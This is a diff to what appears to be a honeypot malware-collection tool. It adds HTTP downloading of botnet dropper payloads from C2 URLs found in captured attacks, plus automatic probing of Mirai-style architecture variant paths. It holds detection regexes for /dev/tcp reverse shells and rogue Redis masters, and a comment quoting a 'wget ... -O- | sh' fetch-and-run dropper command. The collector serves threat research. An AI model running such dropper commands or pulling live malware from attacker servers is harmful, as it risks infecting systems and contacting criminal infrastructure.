@@ -20,6 +20,8 @@ import re
 import socket
 import threading
 import time
+import urllib.request
+import urllib.error
 
 try:
     import capture as _cap          # reuse filetype/triage
@@ -42,8 +44,30 @@ _LOCK = threading.Lock()
 
 _DEVTCP_RE = re.compile(r"/dev/tcp/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/(\d{1,5})")
 _REDIS_URL_RE = re.compile(r"redis://([0-9]{1,3}(?:\.[0-9]{1,3}){3}):(\d{1,5})")
+_HTTP_URL_RE = re.compile(r"https?://([0-9]{1,3}(?:\.[0-9]{1,3}){3}(?::\d{1,5})?/[^\s'\"&>;|]*)")
 # the bare request the loader sends, e.g.  echo -n 'GET /linux'
 _GETREQ_RE = re.compile(r"\b(GET\s+/[^\s'\"&>;|]+)")
+
+# Architecture suffixes used by IoT/Linux botnets (Mirai family and variants).
+# When we see /x86 we automatically probe all others on the same server.
+_ARCH_PATHS = [
+    "/x86", "/x86_64", "/x64", "/arm", "/arm7", "/arm6", "/arm64", "/aarch64",
+    "/mips", "/mipsel", "/mips64", "/mipsbe", "/mipsle",
+    "/ppc", "/ppc64", "/sh4", "/sparc", "/m68k", "/i586", "/i686",
+    "/linux", "/linux_x86", "/linux_arm", "/elf",
+]
+# Additional arch variant filenames used by Mirai-style droppers (client_<arch>)
+_CLIENT_ARCH_PATHS = [
+    "/bins/client_x86_64", "/bins/client_i686", "/bins/client_i586",
+    "/bins/client_mips", "/bins/client_mipsel", "/bins/client_armv4l",
+    "/bins/client_armv5l", "/bins/client_armv6l", "/bins/client_armv7l",
+    "/bins/client_powerpc", "/bins/client_m68k", "/bins/client_sh4",
+]
+_ARCH_PATH_RE = re.compile(
+    r"^(/(?:" + "|".join(re.escape(p.lstrip("/")) for p in _ARCH_PATHS) + r"))$", re.IGNORECASE
+)
+# Regex to detect if a URL's path is under a /bins/ dropper directory
+_BINS_PATH_RE = re.compile(r"/bins/client_", re.IGNORECASE)
 
 
 def _skip(host: str) -> bool:
@@ -94,6 +118,16 @@ def fetch_raw(host: str, port: int, request: bytes, timeout: int = 12) -> bytes:
     except Exception:
         return data
     return data[:PULL_MAX]
+
+
+def fetch_http(url: str, timeout: int = 12) -> bytes:
+    """Download a C2 payload over plain HTTP/HTTPS. Mimics curl to avoid bot filters."""
+    try:
+        req = urllib.request.Request(url, headers={"User-Agent": "curl/7.88.1"})
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.read(PULL_MAX)
+    except Exception:
+        return b""
 
 
 def _parse_resp_commands(stream: bytes) -> list[str]:
@@ -261,6 +295,24 @@ def parse_targets(ev: dict) -> list:
         targets.append({"method": "raw", "host": host, "port": int(port),
                         "request": req_bytes})
 
+    # HTTP/HTTPS C2 dropper URLs (e.g. wget http://1.2.3.4:8081/x86 -O- | sh)
+    # These arrive in redis_c2_urls / c2_urls and also embedded in cron payloads.
+    for match in _HTTP_URL_RE.findall(blob):
+        full_url = "http://" + match if not match.startswith("http") else match
+        # rebuild: _HTTP_URL_RE captures the host:port/path part
+        full_url = next(
+            (u for u in (ev.get("redis_c2_urls") or []) + (ev.get("c2_urls") or [])
+             if match in u), "http://" + match)
+        host_part = match.split("/")[0].split(":")[0]
+        if _skip(host_part):
+            continue
+        key = ("http", full_url, "0")
+        if key in seen:
+            continue
+        seen.add(key)
+        targets.append({"method": "http", "host": host_part, "port": 0,
+                        "url": full_url})
+
     # redis rogue masters (SLAVEOF/REPLICAOF) → try BOTH replica pull AND, if we
     # found a GET request, a raw fetch on the same port (worms often serve both).
     for host, port in set(_REDIS_URL_RE.findall(blob)):
@@ -278,6 +330,58 @@ def parse_targets(ev: dict) -> list:
                 targets.append({"method": "raw", "host": host, "port": int(port),
                                 "request": req_bytes})
     return targets
+
+
+def fetch_arch_variants(base_url: str, timeout: int = 10) -> list[dict]:
+    """When a dropper URL ends in an arch path (e.g. /x86 or /bins/client_mips),
+    probe all other known arch variants on the same server and store whatever
+    responds with a non-empty ELF/PE/binary body.
+    Returns list of stored sample dicts."""
+    from urllib.parse import urlparse
+    p = urlparse(base_url)
+    is_arch = _ARCH_PATH_RE.match(p.path)
+    is_bins = _BINS_PATH_RE.search(p.path)
+    if not is_arch and not is_bins:
+        return []
+    base = f"{p.scheme}://{p.netloc}"
+    # For /bins/client_* style, extract the base path prefix
+    if is_bins:
+        bins_base = p.path.rsplit("/", 1)[0]  # e.g. /payload/bins
+    host = p.hostname or ""
+    if _skip(host):
+        return []
+    results = []
+    seen_sha = set()
+    # Build probe list: simple /arch paths + client_* paths (with bins prefix if applicable)
+    probe_paths = list(_ARCH_PATHS)
+    if is_bins:
+        probe_paths += [bins_base + cp for cp in [
+            "/client_x86_64", "/client_i686", "/client_i586",
+            "/client_mips", "/client_mipsel", "/client_armv4l",
+            "/client_armv5l", "/client_armv6l", "/client_armv7l",
+            "/client_powerpc", "/client_m68k", "/client_sh4",
+        ]]
+    for arch in probe_paths:
+        url = base + arch
+        if url == base_url:
+            continue  # already have this one
+        try:
+            req = urllib.request.Request(url, headers={"User-Agent": "curl/7.88.1"})
+            with urllib.request.urlopen(req, timeout=timeout) as r:
+                if r.status != 200:
+                    continue
+                data = r.read(PULL_MAX)
+        except Exception:
+            continue
+        if len(data) < 128:
+            continue
+        entry = _store(data, url)
+        if entry and entry["sha256"] not in seen_sha:
+            seen_sha.add(entry["sha256"])
+            results.append(entry)
+            print(f"[c2-pull] arch-variant {arch}: {len(data)}B "
+                  f"sha={entry['sha256'][:12]} from {url}", flush=True)
+    return results
 
 
 def pull_all(ev: dict) -> list:
@@ -298,7 +402,11 @@ def pull_all(ev: dict) -> list:
                     out.append({**hit["result"], "cached": True})
                 continue
         repl_cmds: list[str] = []
-        if method == "raw":
+        if method == "http":
+            url = t.get("url", f"http://{host}/")
+            data = fetch_http(url)
+            src = url
+        elif method == "raw":
             data = fetch_raw(host, port, req or b"GET /linux")
             src = f"raw://{host}:{port}{(' ' + req.decode('latin-1')) if req else ''}"
         else:
@@ -324,4 +432,9 @@ def pull_all(ev: dict) -> list:
                   f"sha={entry.get('sha256','')[:12]} repl_cmds={len(repl_cmds)} "
                   f"from {src}", flush=True)
             out.append(entry)
+            # Auto-probe arch variants when the URL path is an arch name (/x86 etc.)
+            if method == "http":
+                url_used = t.get("url", "")
+                variants = fetch_arch_variants(url_used)
+                out.extend(variants)
     return out
